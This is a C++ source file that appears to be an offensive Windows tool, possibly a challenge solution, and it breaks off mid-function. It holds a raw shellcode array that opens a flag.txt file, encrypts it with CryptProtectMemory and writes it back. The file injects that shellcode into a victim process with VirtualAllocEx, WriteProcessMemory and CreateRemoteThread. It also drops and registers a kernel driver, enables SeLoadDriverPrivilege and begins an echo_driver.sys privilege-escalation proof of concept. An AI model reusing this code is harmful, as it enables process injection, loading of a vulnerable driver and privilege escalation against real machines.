#include "Header.h"
#include <iostream>
#include <tlhelp32.h>
#include <dpapi.h>
#pragma comment(lib, "Crypt32.lib")

unsigned char shellcode[] =
{
   0x48,0x81,0xEC,0x28,0x0A,0x00,0x00,0x48,0xB8,0x88,0x99,0xFF,0xEE,0xDD,0xCC,0xBB,0xAA,0x48,0x89,0x84,0x24,0xC8,0x00,0x00,0x00,0x48,0xB8,0x99,0x88,0xFF,0xEE,0xDD,0xCC,0xBB,0xAA,0x48,0x89,0x84,0x24,0xC0,0x00,0x00,0x00,0xC6,0x44,0x24,0x68,0x43,0xC6,0x44,0x24,0x69,0x72,0xC6,0x44,0x24,0x6A,0x65,0xC6,0x44,0x24,0x6B,0x61,0xC6,0x44,0x24,0x6C,0x74,0xC6,0x44,0x24,0x6D,0x65,0xC6,0x44,0x24,0x6E,0x46,0xC6,0x44,0x24,0x6F,0x69,0xC6,0x44,0x24,0x70,0x6C,0xC6,0x44,0x24,0x71,0x65,0xC6,0x44,0x24,0x72,0x57,0xC6,0x44,0x24,0x73,0x00,0xC6,0x44,0x24,0x78,0x47,0xC6,0x44,0x24,0x79,0x65,0xC6,0x44,0x24,0x7A,0x74,0xC6,0x44,0x24,0x7B,0x46,0xC6,0x44,0x24,0x7C,0x69,0xC6,0x44,0x24,0x7D,0x6C,0xC6,0x44,0x24,0x7E,0x65,0xC6,0x44,0x24,0x7F,0x53,0xC6,0x84,0x24,0x80,0x00,0x00,0x00,0x69,0xC6,0x84,0x24,0x81,0x00,0x00,0x00,0x7A,0xC6,0x84,0x24,0x82,0x00,0x00,0x00,0x65,0xC6,0x84,0x24,0x83,0x00,0x00,0x00,0x00,0xB8,0x4B,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x10,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x12,0x01,0x00,0x00,0xB8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x14,0x01,0x00,0x00,0xB8,0x6E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x16,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x18,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x1A,0x01,0x00,0x00,0xB8,0x33,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x1C,0x01,0x00,0x00,0xB8,0x32,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x1E,0x01,0x00,0x00,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x20,0x01,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x22,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x24,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x26,0x01,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0x28,0x01,0x00,0x00,0xC6,0x84,0x24,0xF0,0x00,0x00,0x00,0x43,0xC6,0x84,0x24,0xF1,0x00,0x00,0x00,0x52,0xC6,0x84,0x24,0xF2,0x00,0x00,0x00,0x59,0xC6,0x84,0x24,0xF3,0x00,0x00,0x00,0x50,0xC6,0x84,0x24,0xF4,0x00,0x00,0x00,0x54,0xC6,0x84,0x24,0xF5,0x00,0x00,0x00,0x42,0xC6,0x84,0x24,0xF6,0x00,0x00,0x00,0x41,0xC6,0x84,0x24,0xF7,0x00,0x00,0x00,0x53,0xC6,0x84,0x24,0xF8,0x00,0x00,0x00,0x45,0xC6,0x84,0x24,0xF9,0x00,0x00,0x00,0x2E,0xC6,0x84,0x24,0xFA,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0xFB,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xFC,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xFD,0x00,0x00,0x00,0x00,0xB8,0x43,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xC0,0x01,0x00,0x00,0xB8,0x52,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xC2,0x01,0x00,0x00,0xB8,0x59,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xC4,0x01,0x00,0x00,0xB8,0x50,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xC6,0x01,0x00,0x00,0xB8,0x54,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xC8,0x01,0x00,0x00,0xB8,0x42,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xCA,0x01,0x00,0x00,0xB8,0x41,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xCC,0x01,0x00,0x00,0xB8,0x53,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xCE,0x01,0x00,0x00,0xB8,0x45,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xD0,0x01,0x00,0x00,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xD2,0x01,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xD4,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xD6,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xD8,0x01,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0xDA,0x01,0x00,0x00,0xC6,0x84,0x24,0x98,0x00,0x00,0x00,0x4C,0xC6,0x84,0x24,0x99,0x00,0x00,0x00,0x6F,0xC6,0x84,0x24,0x9A,0x00,0x00,0x00,0x61,0xC6,0x84,0x24,0x9B,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0x9C,0x00,0x00,0x00,0x4C,0xC6,0x84,0x24,0x9D,0x00,0x00,0x00,0x69,0xC6,0x84,0x24,0x9E,0x00,0x00,0x00,0x62,0xC6,0x84,0x24,0x9F,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xA0,0x00,0x00,0x00,0x61,0xC6,0x84,0x24,0xA1,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xA2,0x00,0x00,0x00,0x79,0xC6,0x84,0x24,0xA3,0x00,0x00,0x00,0x41,0xC6,0x84,0x24,0xA4,0x00,0x00,0x00,0x00,0xC6,0x44,0x24,0x48,0x52,0xC6,0x44,0x24,0x49,0x65,0xC6,0x44,0x24,0x4A,0x61,0xC6,0x44,0x24,0x4B,0x64,0xC6,0x44,0x24,0x4C,0x46,0xC6,0x44,0x24,0x4D,0x69,0xC6,0x44,0x24,0x4E,0x6C,0xC6,0x44,0x24,0x4F,0x65,0xC6,0x44,0x24,0x50,0x00,0xC6,0x84,0x24,0xA8,0x00,0x00,0x00,0x43,0xC6,0x84,0x24,0xA9,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xAA,0x00,0x00,0x00,0x79,0xC6,0x84,0x24,0xAB,0x00,0x00,0x00,0x70,0xC6,0x84,0x24,0xAC,0x00,0x00,0x00,0x74,0xC6,0x84,0x24,0xAD,0x00,0x00,0x00,0x50,0xC6,0x84,0x24,0xAE,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xAF,0x00,0x00,0x00,0x6F,0xC6,0x84,0x24,0xB0,0x00,0x00,0x00,0x74,0xC6,0x84,0x24,0xB1,0x00,0x00,0x00,0x65,0xC6,0x84,0x24,0xB2,0x00,0x00,0x00,0x63,0xC6,0x84,0x24,0xB3,0x00,0x00,0x00,0x74,0xC6,0x84,0x24,0xB4,0x00,0x00,0x00,0x4D,0xC6,0x84,0x24,0xB5,0x00,0x00,0x00,0x65,0xC6,0x84,0x24,0xB6,0x00,0x00,0x00,0x6D,0xC6,0x84,0x24,0xB7,0x00,0x00,0x00,0x6F,0xC6,0x84,0x24,0xB8,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xB9,0x00,0x00,0x00,0x79,0xC6,0x84,0x24,0xBA,0x00,0x00,0x00,0x00,0xC6,0x84,0x24,0x88,0x00,0x00,0x00,0x43,0xC6,0x84,0x24,0x89,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0x8A,0x00,0x00,0x00,0x6F,0xC6,0x84,0x24,0x8B,0x00,0x00,0x00,0x73,0xC6,0x84,0x24,0x8C,0x00,0x00,0x00,0x65,0xC6,0x84,0x24,0x8D,0x00,0x00,0x00,0x48,0xC6,0x84,0x24,0x8E,0x00,0x00,0x00,0x61,0xC6,0x84,0x24,0x8F,0x00,0x00,0x00,0x6E,0xC6,0x84,0x24,0x90,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0x91,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0x92,0x00,0x00,0x00,0x65,0xC6,0x84,0x24,0x93,0x00,0x00,0x00,0x00,0xC6,0x44,0x24,0x58,0x57,0xC6,0x44,0x24,0x59,0x72,0xC6,0x44,0x24,0x5A,0x69,0xC6,0x44,0x24,0x5B,0x74,0xC6,0x44,0x24,0x5C,0x65,0xC6,0x44,0x24,0x5D,0x46,0xC6,0x44,0x24,0x5E,0x69,0xC6,0x44,0x24,0x5F,0x6C,0xC6,0x44,0x24,0x60,0x65,0xC6,0x44,0x24,0x61,0x00,0xC6,0x84,0x24,0xD0,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0xD1,0x00,0x00,0x00,0x70,0xC6,0x84,0x24,0xD2,0x00,0x00,0x00,0x61,0xC6,0x84,0x24,0xD3,0x00,0x00,0x00,0x70,0xC6,0x84,0x24,0xD4,0x00,0x00,0x00,0x69,0xC6,0x84,0x24,0xD5,0x00,0x00,0x00,0x2E,0xC6,0x84,0x24,0xD6,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0xD7,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xD8,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xD9,0x00,0x00,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x30,0x01,0x00,0x00,0xB8,0x70,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x32,0x01,0x00,0x00,0xB8,0x61,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x34,0x01,0x00,0x00,0xB8,0x70,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x36,0x01,0x00,0x00,0xB8,0x69,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x38,0x01,0x00,0x00,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x3A,0x01,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x3C,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x3E,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x40,0x01,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0x42,0x01,0x00,0x00,0xC6,0x84,0x24,0xE0,0x00,0x00,0x00,0x43,0xC6,0x84,0x24,0xE1,0x00,0x00,0x00,0x72,0xC6,0x84,0x24,0xE2,0x00,0x00,0x00,0x79,0xC6,0x84,0x24,0xE3,0x00,0x00,0x00,0x70,0xC6,0x84,0x24,0xE4,0x00,0x00,0x00,0x74,0xC6,0x84,0x24,0xE5,0x00,0x00,0x00,0x33,0xC6,0x84,0x24,0xE6,0x00,0x00,0x00,0x32,0xC6,0x84,0x24,0xE7,0x00,0x00,0x00,0x2E,0xC6,0x84,0x24,0xE8,0x00,0x00,0x00,0x64,0xC6,0x84,0x24,0xE9,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xEA,0x00,0x00,0x00,0x6C,0xC6,0x84,0x24,0xEB,0x00,0x00,0x00,0x00,0xB8,0x41,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xA0,0x01,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xA2,0x01,0x00,0x00,0xB8,0x76,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xA4,0x01,0x00,0x00,0xB8,0x61,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xA6,0x01,0x00,0x00,0xB8,0x70,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xA8,0x01,0x00,0x00,0xB8,0x69,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xAA,0x01,0x00,0x00,0xB8,0x33,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xAC,0x01,0x00,0x00,0xB8,0x32,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xAE,0x01,0x00,0x00,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xB0,0x01,0x00,0x00,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xB2,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xB4,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xB6,0x01,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0xB8,0x01,0x00,0x00,0xB8,0x43,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x50,0x01,0x00,0x00,0xB8,0x3A,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x52,0x01,0x00,0x00,0xB8,0x5C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x54,0x01,0x00,0x00,0xB8,0x55,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x56,0x01,0x00,0x00,0xB8,0x73,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x58,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x5A,0x01,0x00,0x00,0xB8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x5C,0x01,0x00,0x00,0xB8,0x73,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x5E,0x01,0x00,0x00,0xB8,0x5C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x60,0x01,0x00,0x00,0xB8,0x63,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x62,0x01,0x00,0x00,0xB8,0x79,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x64,0x01,0x00,0x00,0xB8,0x62,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x66,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x68,0x01,0x00,0x00,0xB8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x6A,0x01,0x00,0x00,0xB8,0x5F,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x6C,0x01,0x00,0x00,0xB8,0x62,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x6E,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x70,0x01,0x00,0x00,0xB8,0x62,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x72,0x01,0x00,0x00,0xB8,0x75,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x74,0x01,0x00,0x00,0xB8,0x73,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x76,0x01,0x00,0x00,0xB8,0x5C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x78,0x01,0x00,0x00,0xB8,0x44,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x7A,0x01,0x00,0x00,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x7C,0x01,0x00,0x00,0xB8,0x73,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x7E,0x01,0x00,0x00,0xB8,0x6B,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x80,0x01,0x00,0x00,0xB8,0x74,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x82,0x01,0x00,0x00,0xB8,0x6F,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x84,0x01,0x00,0x00,0xB8,0x70,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x86,0x01,0x00,0x00,0xB8,0x5C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x88,0x01,0x00,0x00,0xB8,0x66,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x8A,0x01,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x8C,0x01,0x00,0x00,0xB8,0x61,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x8E,0x01,0x00,0x00,0xB8,0x67,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x90,0x01,0x00,0x00,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x92,0x01,0x00,0x00,0xB8,0x74,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x94,0x01,0x00,0x00,0xB8,0x78,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x96,0x01,0x00,0x00,0xB8,0x74,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x98,0x01,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0x9A,0x01,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x94,0x24,0x98,0x00,0x00,0x00,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0x10,0x02,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x54,0x24,0x68,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xE0,0x01,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x54,0x24,0x78,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xF0,0x01,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x54,0x24,0x48,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xF8,0x01,0x00,0x00,0x48,0x8D,0x8C,0x24,0x30,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x94,0x24,0xA8,0x00,0x00,0x00,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0x00,0x02,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x94,0x24,0x88,0x00,0x00,0x00,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xE8,0x01,0x00,0x00,0x48,0x8D,0x8C,0x24,0x10,0x01,0x00,0x00,0xFF,0x94,0x24,0xC0,0x00,0x00,0x00,0x48,0x8D,0x54,0x24,0x58,0x48,0x8B,0xC8,0xFF,0x94,0x24,0xC8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0x08,0x02,0x00,0x00,0x48,0xC7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0xC7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0xC7,0x44,0x24,0x20,0x03,0x00,0x00,0x00,0x45,0x33,0xC9,0x41,0xB8,0x03,0x00,0x00,0x00,0xBA,0x00,0x00,0x00,0x80,0x48,0x8D,0x8C,0x24,0x50,0x01,0x00,0x00,0xFF,0x94,0x24,0xE0,0x01,0x00,0x00,0x48,0x89,0x84,0x24,0x00,0x01,0x00,0x00,0xC7,0x84,0x24,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x33,0xD2,0x48,0x8B,0x8C,0x24,0x00,0x01,0x00,0x00,0xFF,0x94,0x24,0xF0,0x01,0x00,0x00,0x83,0xC0,0x20,0x89,0x44,0x24,0x40,0x33,0xD2,0x8B,0x44,0x24,0x40,0xB9,0x10,0x00,0x00,0x00,0xF7,0xF1,0x8B,0xC2,0x85,0xC0,0x74,0x24,0x33,0xD2,0x8B,0x44,0x24,0x40,0xB9,0x10,0x00,0x00,0x00,0xF7,0xF1,0x8B,0xC2,0xB9,0x10,0x00,0x00,0x00,0x2B,0xC8,0x8B,0xC1,0x8B,0x4C,0x24,0x40,0x03,0xC8,0x8B,0xC1,0x89,0x44,0x24,0x40,0xC7,0x44,0x24,0x44,0x00,0x00,0x00,0x00,0xEB,0x0A,0x8B,0x44,0x24,0x44,0xFF,0xC0,0x89,0x44,0x24,0x44,0x81,0x7C,0x24,0x44,0x00,0x08,0x00,0x00,0x7D,0x0F,0x48,0x63,0x44,0x24,0x44,0xC6,0x84,0x04,0x20,0x02,0x00,0x00,0x00,0xEB,0xDD,0x48,0xC7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x4C,0x8D,0x8C,0x24,0x08,0x01,0x00,0x00,0x44,0x8B,0x44,0x24,0x40,0x48,0x8D,0x94,0x24,0x20,0x02,0x00,0x00,0x48,0x8B,0x8C,0x24,0x00,0x01,0x00,0x00,0xFF,0x94,0x24,0xF8,0x01,0x00,0x00,0x45,0x33,0xC0,0x8B,0x54,0x24,0x40,0x48,0x8D,0x8C,0x24,0x20,0x02,0x00,0x00,0xFF,0x94,0x24,0x00,0x02,0x00,0x00,0x48,0x8B,0x8C,0x24,0x00,0x01,0x00,0x00,0xFF,0x94,0x24,0xE8,0x01,0x00,0x00,0x48,0xC7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0xC7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0xC7,0x44,0x24,0x20,0x03,0x00,0x00,0x00,0x45,0x33,0xC9,0x41,0xB8,0x02,0x00,0x00,0x00,0xBA,0x00,0x00,0x00,0x40,0x48,0x8D,0x8C,0x24,0x50,0x01,0x00,0x00,0xFF,0x94,0x24,0xE0,0x01,0x00,0x00,0x48,0x89,0x84,0x24,0x00,0x01,0x00,0x00,0x48,0xC7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x4C,0x8D,0x8C,0x24,0x08,0x01,0x00,0x00,0x44,0x8B,0x44,0x24,0x40,0x48,0x8D,0x94,0x24,0x20,0x02,0x00,0x00,0x48,0x8B,0x8C,0x24,0x00,0x01,0x00,0x00,0xFF,0x94,0x24,0x08,0x02,0x00,0x00,0x48,0x8B,0x8C,0x24,0x00,0x01,0x00,0x00,0xFF,0x94,0x24,0xE8,0x01,0x00,0x00,0x33,0xC0,0x48,0x81,0xC4,0x28,0x0A,0x00,0x00,0xC3 
};

int findMyProc(const wchar_t* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (lstrcmpW(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

bool Migrate(DWORD victimPid) {
    // find process to migrate
    HANDLE victimHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, victimPid);
    if (victimHandle == nullptr)
    {
        //std::cout << "[-] Error using OpenProcess on PID {" << victimPid << " }: ERROR {" << GetLastError() << "}" << std::endl;
        return -1;
    }
    //std::cout << "[+] Got a handle to PID " << victimPid << " succesfuly" << std::endl;

    // allocate shellcode within victim
    DWORD_PTR shellcodeSize = sizeof(shellcode);
    
    *(uint64_t*)(shellcode + 9) = (uint64_t)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "GetProcAddress");
    *(uint64_t*)(shellcode + 27) = (uint64_t)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "GetModuleHandleW");

    LPVOID baseAddress = VirtualAllocEx(victimHandle, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (baseAddress == nullptr)
    {
        //std::cout << "[-] Error allocating shellcode with VirtualAllocEx on PID {}: ERROR {}" << std::endl;
        return -1;
    }
    //std::cout << "[+] Allocated space for shellcode in start address: {}" << std::endl;

    //write shellcode
    size_t bytess = 0;

    bool status = WriteProcessMemory(victimHandle, baseAddress, shellcode, sizeof(shellcode), &bytess);
    if (!status)
    {
        //std::cout << "[-] Error writing shellcode with WriteProcessMemory on Explorer.exe : ERROR {}" << std::endl;
        return -1;
    }
    //std::cout << "[+] Succesfuly wrote shellcode to victim. about to start the Mirroring" << std::endl;


    HMODULE lib = LoadLibraryA("ntdll.dll");
    if (!lib)
    {
        return -1;
    }

    CreateRemoteThread(victimHandle, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, nullptr, 0, 0);
    /*RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");
    if (!RtlCreateProcessReflection)
    {
        return -1;
    }

    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
    NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, nullptr, NULL, &info);
    if (reflectRet == STATUS_SUCCESS) {
        std::cout << "[+] Succesfully Mirrored to new PID: " << (DWORD)info.ReflectionClientId.UniqueProcess << std::endl;
    }
    else {
        std::cout << "[!] Error Mirroring: ERROR " << GetLastError() << std::endl;
    }
    
    DWORD reflectPid = (DWORD)info.ReflectionClientId.UniqueProcess;

    return true;*/
};

bool InstallDriver() {
    WCHAR RegistrySubKey[] = L"SYSTEM\\CurrentControlSet\\Services\\sys_int";
    WCHAR ImagePath[] = L"\\??\\C:\\Windows\\System32\\drivers\\sys_int.sys";

    HKEY phkDriverService;
    BYTE RegValueData[sizeof(DWORD)];

    if (RegCreateKeyW(HKEY_LOCAL_MACHINE,
        RegistrySubKey,
        &phkDriverService)) 
    {
        return false;
    }

    *(DWORD*)RegValueData = 3;

    if (RegSetValueExW(phkDriverService,
        L"Start",
        0,
        REG_DWORD,
        RegValueData,
        sizeof(DWORD)))
    {
        return false;
    }

    *(DWORD*)RegValueData = 1;

    if (RegSetValueExW(phkDriverService,
        L"Type",
        0,
        REG_DWORD,
        RegValueData,
        sizeof(DWORD)))
    {
        return false;
    }

    *(DWORD*)RegValueData = 1;

    if (RegSetValueExW(phkDriverService,
        L"ErrorControl",
        0,
        REG_DWORD,
        RegValueData,
        sizeof(DWORD)))
    {
        return false;
    }

    if (RegSetValueExW(phkDriverService,
        L"ImagePath",
        0,
        REG_EXPAND_SZ,
        (const BYTE*)ImagePath,
        lstrlenW(ImagePath) * 2 + 2))
    {
        return false;
    }

    return false;
};

bool AdjustPrivs() {
    HANDLE hCurrentProcess = GetCurrentProcess();
    HANDLE hCurrentProcessToken = INVALID_HANDLE_VALUE;

    if (OpenProcessToken(hCurrentProcess,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hCurrentProcessToken))
    {
        TOKEN_PRIVILEGES NewPrivState;

        if (LookupPrivilegeValueA(NULL,
            "SeLoadDriverPrivilege",
            &NewPrivState.Privileges[0].Luid))
        {
            NewPrivState.PrivilegeCount = 1;
            NewPrivState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (AdjustTokenPrivileges(hCurrentProcessToken,
                false,
                &NewPrivState,
                0,
                0,
                0))
            {
                return true;
            }
        }
    }

    return false;
};

bool DropDriverToFileSystem() {
    HRSRC hResourceInfo = FindResource(NULL,
        MAKEINTRESOURCE(IDR_RCDATA1),
        RT_RCDATA);

    if (hResourceInfo == nullptr) {
        return false;
    }

    HGLOBAL hResourceData = LoadResource(NULL, hResourceInfo);

    if (hResourceData == nullptr)
    {
        return false;
    }

    const void* pvResourceData = LockResource(hResourceData);
    
    if (pvResourceData == nullptr)
    {
        return false;
    }

    DWORD dwResourceSize = SizeofResource(NULL, hResourceInfo);
    
    if (dwResourceSize == 0)
    {
        return false;
    }

    HANDLE hOutFile = CreateFileW(DROP_PATH,
        GENERIC_WRITE,
        NULL,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hOutFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwNumberOfBytesWritten = 0;
    WriteFile(hOutFile, pvResourceData, dwResourceSize, &dwNumberOfBytesWritten, NULL);
    CloseHandle(hOutFile);

    if (dwResourceSize != dwNumberOfBytesWritten) {
        return false;
    }

    return true;
};

int ElevatePriv() {
    //SetConsoleTitle(L"echo.ac PoC");
    //std::cout << "[?] echo_driver.sys Privilege Escalation PoC demonstration." << std::endl;
    DriverInterface Driver; // Instantiate our driver
    HANDLE processHandle = Driver.get_handle_for_pid(GetCurrentProcessId()); // Fetch a HANDLE for our own program.

    NTSTATUS status; // Status variable
